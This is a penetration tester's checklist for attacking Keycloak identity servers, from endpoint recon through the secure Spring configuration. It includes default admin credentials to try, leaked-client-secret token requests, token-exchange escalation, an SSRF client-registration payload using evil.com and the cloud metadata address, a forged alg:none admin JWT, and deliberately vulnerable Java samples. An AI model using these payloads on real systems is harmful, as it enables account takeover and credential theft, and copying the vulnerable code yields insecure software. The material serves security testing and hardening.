tactic: Initial Access


**Keycloak** is an open-source Identity and Access Management (IAM) solution used to handle authentication, authorization, and SSO for applications. It implements OAuth 2.0, OpenID Connect, and SAML. Misconfigurations in Keycloak are extremely common and can lead to account takeover, token forgery, and full realm compromise.

```
User → Keycloak (Auth Server) → issues token → Client App → access Resource
```


Key concepts:

| Term          | What it means                                                |
| ------------- | ------------------------------------------------------------ |
| Realm         | Isolated tenant each realm has its own users, clients, roles |
| Client        | An app registered in Keycloak (your Spring Boot app, etc.)   |
| Client Secret | Credential used by confidential clients to get tokens        |
| Role          | Permission assigned to users (realm role vs client role)     |
| Bearer Token  | JWT access token presented to APIs                           |
| Admin Console | `/auth/admin`  full control over the realm                   |
| Well-known    | `/.well-known/openid-configuration`  discovery endpoint      |

---

## Recon

```
/auth/admin                              → Admin console login
/auth/realms/{realm}                     → Realm info
/auth/realms/{realm}/.well-known/openid-configuration  → Full OIDC config
/auth/realms/{realm}/protocol/openid-connect/token      → Token endpoint
/auth/realms/{realm}/protocol/openid-connect/userinfo   → Userinfo endpoint
/auth/realms/{realm}/protocol/openid-connect/certs      → Public keys (JWKS)
/auth/realms/{realm}/account             → Self-service account page
```

Try common realm names if unknown:

```
master / demo / test / dev / prod / internal / app / company-name
```

---

## Injection Points

- Admin console exposed to the internet
- Weak or default credentials on admin account
- Client `redirect_uri` not validated (see [[OAuth 2.0]])
- JWT token signature not verified by the app (see [[JWT (JSON Web Tokens)]])
- Open user registration enabled on sensitive realms
- Client credentials flow with weak/leaked `client_secret`
- Token exchange misconfiguration allowing privilege escalation
- Realm misconfiguration exposing internal roles to public clients

---

## Checklist

### Admin Console Exposure

- [ ]  Check if `/auth/admin` is publicly accessible
- [ ]  Try default credentials: `admin:admin`, `admin:password`, `keycloak:keycloak`
- [ ]  If login page loads → report exposure regardless of credentials

### Realm & Client Enumeration

- [ ]  Fetch realm info  reveals realm name, public key, endpoints:

```
	GET /auth/realms/<bruteForceMe>
```

- [ ]  Full OIDC config to map all endpoints:

```
	GET /auth/realms/{realm}/.well-known/openid-configuration
```

- [ ]  Check if registration is open:

```
	GET /auth/realms/{realm}/protocol/openid-connect/registrations
```


### Client Secret Leak

- [ ]  Check JS source files, mobile apps, `.env` files for `client_secret`
- [ ]  If found, request a token directly:

```http
	POST /auth/realms/{realm}/protocol/openid-connect/token
	Content-Type: application/x-www-form-urlencoded

	grant_type=client_credentials&client_id=app&client_secret=LEAKED_SECRET
```

### Token Exchange / Privilege Escalation

- [ ]  Check if token exchange is enabled:

```http
	POST /auth/realms/{realm}/protocol/openid-connect/token
	grant_type=urn:ietf:params:oauth:grant-type:token-exchange
	&subject_token=YOUR_TOKEN
	&requested_token_type=urn:ietf:params:oauth:token-type:access_token
	&audience=target-client
```

- [ ]  Try exchanging a low-privilege token for a higher-privilege one

### Open Redirect via redirect_uri

- [ ]  Follow the same [[OAuth 2.0]] redirect_uri checklist — Keycloak is an OAuth server

### SSRF via Dynamic Client Registration

- [ ]  Check if `/clients-registrations` is enabled without auth
- [ ]  Register a client with `logo_uri` pointing to internal metadata:

```json
	{
	  "client_id": "evil",
	  "redirect_uris": ["https://evil.com"],
	  "logo_uri": "http://169.254.169.254/latest/meta-data/"
	}
```

---

## Attack Payloads

**Get token with client credentials:**

```http
POST /auth/realms/demo/protocol/openid-connect/token
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials&client_id=myclient&client_secret=LEAKED
```

**alg:none JWT (base64url encoded, no signature):**

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0IiwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbImFkbWluIl19fQ.
```

**Force open registration to create account:**

```
GET /auth/realms/internal/protocol/openid-connect/registrations
?client_id=account&response_type=code&redirect_uri=https://app.com/callback
```

---

## White Box Testing

**Vulnerable — app does not verify JWT signature:**

```java
@GetMapping("/api/secure")
public ResponseEntity<?> secureEndpoint(@RequestHeader("Authorization") String authHeader) {
    String token = authHeader.replace("Bearer ", "");

    // ← manually decoding JWT without verifying signature
    String payload = new String(Base64.decode(token.split("\\.")[1]));
    JSONObject claims = new JSONObject(payload);

    String role = claims.getString("role"); // ← attacker can forge any role
    if ("admin".equals(role)) {
        return ResponseEntity.ok(adminData());
    }
    return ResponseEntity.status(403).build();
}
```

**Vulnerable — accepts alg:none or trusts client-supplied algorithm:**

```java
// Using an old/misconfigured JWT library
Jwt jwt = Jwts.parser()
    .setSigningKey(secret)
    .parseClaimsJws(token); // ← some old versions accept alg:none silently
```

**Vulnerable — client_secret hardcoded in source:**

```java
@Service
public class KeycloakService {
    private static final String CLIENT_SECRET = "abc123supersecret"; // ← hardcoded
    private static final String CLIENT_ID = "backend-service";

    public String getToken() {
        // uses hardcoded secret to request tokens
    }
}
```

**Secure:**

```java
// Always verify JWT using Keycloak's public key from JWKS endpoint
@Bean
public JwtDecoder jwtDecoder() {
    // fetches public key from Keycloak automatically, no manual parsing
    return JwtDecoders.fromIssuerLocation("https://keycloak.example.com/auth/realms/myrealm");
}

// Use Spring Security OAuth2 resource server,  handles verification automatically
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.oauth2ResourceServer(oauth2 -> oauth2
            .jwt(jwt -> jwt.decoder(jwtDecoder())) // ← verifies sig, exp, iss, aud
        );
        return http.build();
    }
}

// Load client_secret from environment — never hardcode
@Value("${keycloak.client-secret}")
private String clientSecret;
```

---

## Resources

- [Keycloak Security Hardening](https://www.keycloak.org/docs/latest/server_admin/#hardening)